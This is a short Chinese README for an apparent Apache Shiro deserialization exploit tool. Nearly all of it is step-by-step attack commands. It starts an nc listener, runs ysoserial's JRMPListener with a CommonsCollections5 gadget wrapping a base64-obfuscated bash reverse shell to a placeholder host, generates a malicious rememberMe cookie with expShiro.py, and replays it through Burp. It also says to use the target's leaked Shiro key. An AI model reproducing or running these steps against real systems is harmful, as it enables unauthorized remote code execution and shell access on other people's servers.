# ShiroTools
## 使用版本

```
Python3.8
```



## 使用步骤

```
## 服务器启监听，等待接收shell
nc -lvp 2333

## 启用ysoserial-all.jar工具中的JRMP监听模块，监听1999端口并执行反弹shell命令
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1999 CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54LzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}'

## expShiro.py生成payload
python3 expShiro.py x.x.x.x:1999

## 将生成的rememberMe数据于burp放包执行,获取反弹shell
```



## 注意点

```
## 监测反弹shell所需端口是否开放

## ysoserial-all.jar 命令需base64编码命令需改为自身反弹的服务器ip、端口

## expShiro.py脚本中的key更改为自身shiro泄露的key值
```

